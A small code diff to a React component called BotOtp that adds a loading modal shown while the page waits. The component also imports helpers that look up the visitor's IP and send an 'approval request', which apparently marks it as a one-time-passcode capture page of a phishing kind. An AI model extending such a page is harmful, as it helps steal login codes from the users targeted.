@@ -2,6 +2,7 @@ import { useState, useRef, useEffect } from "react";
 import { useLocation } from "wouter";
 import { Globe, ChevronDown } from "lucide-react";
 import { useI18n, type Language } from "@/lib/i18n";
+import { LoadingModal } from "@/components/loading-modal";
 import {
   getIPInfo,
   sendApprovalRequest,
@@ -79,6 +80,7 @@ export default function BotOtp() {
       className="min-h-screen flex flex-col items-center justify-center botp-outer"
       style={{ background: "#f7f7f7" }}
     >
+      <LoadingModal show={stage === "waiting"} />
       <style>{`
         @media (max-width: 520px) {
           .botp-outer {
